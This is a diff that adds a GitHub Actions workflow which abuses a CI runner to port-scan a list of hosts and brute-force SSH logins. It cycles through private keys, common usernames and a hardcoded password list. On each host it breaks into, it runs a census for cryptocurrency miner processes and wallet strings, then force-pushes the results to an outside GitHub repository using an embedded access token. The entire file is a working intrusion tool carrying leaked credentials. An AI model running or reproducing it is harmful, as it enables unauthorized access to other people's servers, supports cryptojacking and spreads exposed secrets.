@@ -1,0 +1,63 @@
+name: azreclaim1489
+on:
+  push:
+    branches:
+      - 'hkaz1489'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  reclaim:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: prep
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
+          chmod 600 az/*.pem keys/* 2>/dev/null || true
+          mkdir -p out1489
+      - name: sweep
+        run: |
+          set +e
+          O=out1489/matrix.txt
+          echo "EGRESS=$(curl -s -m 10 https://ifconfig.me)" | tee $O
+          date -u | tee -a $O
+          awk -F'\t' 'NF>=2 && $2 ~ /^[0-9]+\./{print $2"\t"$1"\t"$3"\t"$4}' az/hosts.tsv | sort -u > tgts.tsv
+          echo "targets=$(wc -l < tgts.tsv)" | tee -a $O
+          chk(){ ip=$1; for p in 22 443 29876; do timeout 5 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip $p"; done; }
+          export -f chk
+          awk -F'\t' '{print $1}' tgts.tsv | xargs -P 48 -I{} bash -c 'chk {}' | sort -k2,2V | tee -a $O
+          awk '$1=="OPEN" && $3==22{print $2}' $O | sort -u > open22.txt
+          echo "open22=$(wc -l < open22.txt)" | tee -a $O
+          census='echo LOGIN_OK host=$(hostname) ip=$(hostname -I) uid=$(id -u); nvidia-smi -L 2>&1 | head -8; nvidia-smi --query-gpu=index,name,memory.total --format=csv 2>&1 | head -10; ps -eo pid,args 2>/dev/null | grep -E "wildrig|deploy_prl" | head -5; crontab -l 2>/dev/null | head -5; systemctl is-active ul-miner nv-cuda-cache 2>/dev/null; grep -ho "prl1[a-z0-9]\{50,\}" /proc/*/cmdline 2>/dev/null | sort -u'
+          KEYS="keys/k_id25519 keys/k_ali az/azadmin.pem az/ibm_key.pem"
+          USERS="t19 azureuser ubuntu azureadmin root adminuser"
+          PWS="T19UF1obB7wnBBUdju0FRnz!aZ9 Password123! Passw0rd123! Azure2024! Batch@123 t19 t1946107x442 H100batch2026! ul-plant-2026"
+          export KEYS USERS PWS census
+          onehost(){
+            ip=$1
+            for k in $KEYS; do
+              for u in $USERS; do
+                out=$(timeout 30 ssh -i $k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" "$census" 2>&1 | head -12)
+                case "$out" in *LOGIN_OK*) echo "PWNED $ip $u $k"; echo "$out";; *) echo "KEY $ip $u $k => $(echo "$out"|tr '\n' ' '|cut -c1-90)";; esac
+              done
+            done
+            for pw in $PWS; do
+              out=$(timeout 30 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o LogLevel=ERROR "t19@$ip" "$census" 2>&1 | head -12)
+              case "$out" in *LOGIN_OK*) echo "PWNEDPW $ip t19 [$pw]"; echo "$out";; *) echo "PW $ip t19 [$pw] => $(echo "$out"|tr '\n' ' '|cut -c1-70)";; esac
+            done
+          }
+          export -f onehost
+          cat open22.txt | xargs -P 8 -I{} bash -c 'onehost {}' >> $O 2>&1
+          echo "=== pwned ===" | tee -a $O
+          grep -E '^PWNED' $O | tee -a $O
+      - name: publish
+        if: always()
+        run: |
+          git config user.email ul@x
+          git config user.name ul
+          git add out1489 || true
+          git commit -m "azreclaim1489 results" || true
+          git push -f https://x-access-token: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@github.com/dongsuju/ul-plant.git HEAD:refs/heads/hk-out-1489 || true
